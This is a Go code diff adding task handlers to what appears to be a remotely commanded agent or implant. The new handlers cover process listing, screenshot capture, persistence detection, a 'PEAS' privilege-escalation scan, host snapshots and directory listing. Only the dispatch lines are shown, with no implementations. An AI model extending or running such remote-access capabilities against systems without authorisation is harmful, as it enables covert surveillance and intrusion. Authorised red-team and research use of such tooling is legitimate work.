@@ -40,6 +40,20 @@ func executeTask(t *protocol.Task) *protocol.TaskResult {
 		}
 	case "download":
 		output, taskErr = downloadFile(t.Payload)
+	case "ps":
+		output, taskErr = listProcesses()
+	case "screenshot":
+		output, taskErr = captureScreenshot()
+	case "persistence":
+		output, taskErr = detectPersistence()
+	case "peas":
+		return startPEASTask(t.ID)
+	case "snapshot":
+		output, taskErr = hostSnapshot()
+	case "ls":
+		output, taskErr = listDirectory(t.Payload)
+	case "cancel":
+		output, taskErr = cancelBackgroundTask(t.Payload)
 	case "complete":
 		extendPathBrowseFastWindow()
 		output, taskErr = completePath(t.Payload)
